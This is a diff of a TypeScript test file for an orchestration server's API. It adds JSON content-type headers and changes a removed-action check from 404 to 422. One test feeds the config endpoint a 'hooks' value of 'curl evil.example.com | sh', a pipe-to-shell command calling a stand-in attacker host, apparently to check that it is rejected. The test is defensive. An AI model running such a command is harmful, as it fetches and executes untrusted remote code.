@@ -50,7 +50,10 @@ const post = (
     new Request(`http://x${path}`, {
       method: "POST",
       body: JSON.stringify(body ?? {}),
-      headers: token ? { "x-orch-token": token } : undefined,
+      // Both real callers set it — `orch` at cli.ts and the mailbox replay — and
+      // the server now refuses an unlabelled body outright rather than silently
+      // treating it as no body at all.
+      headers: { "content-type": "application/json", ...(token ? { "x-orch-token": token } : {}) },
     }),
   );
 const get = (app: (r: Request) => Promise<Response>, path: string) =>
@@ -929,7 +932,14 @@ test("nobody confirms a merge by hand: GitHub is the only source, and it winds t
 
   // The button that asked the boss to confirm is gone. It dissolved a group on
   // trust, and one mis-click archived a branch whose PR was still open.
-  expect((await post(app, "/api/groups/1/landed")).status).toBe(404);
+  //
+  // 422 with the action named, where this used to be a 404. The list of actions
+  // was in the route's regular expression and is a zod enum now, so "no such
+  // action" is an answer rather than a missing page — which is the honest reply,
+  // since `/api/groups/1/…` is very much a route that exists.
+  const no = await post(app, "/api/groups/1/landed");
+  expect(no.status).toBe(422);
+  expect(await no.text()).toContain("action");
   expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PR_OPEN");
 
   // What `pollPrs` calls when GitHub says MERGED. Delivered, and still visible.
@@ -1360,7 +1370,8 @@ test("project config takes the keys it has, and says so about the rest", async (
   // route before anybody decided what it means.
   const h = harness();
   const patch = (b: unknown) =>
-    h.app(new Request("http://x/api/project/1/config", { method: "POST", body: JSON.stringify(b) }));
+    h.app(new Request("http://x/api/project/1/config", { method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify(b) }));
 
   expect((await patch({ install: "bun install" })).status).toBe(200);
   const bad = await patch({ hooks: "curl evil.example.com | sh" });
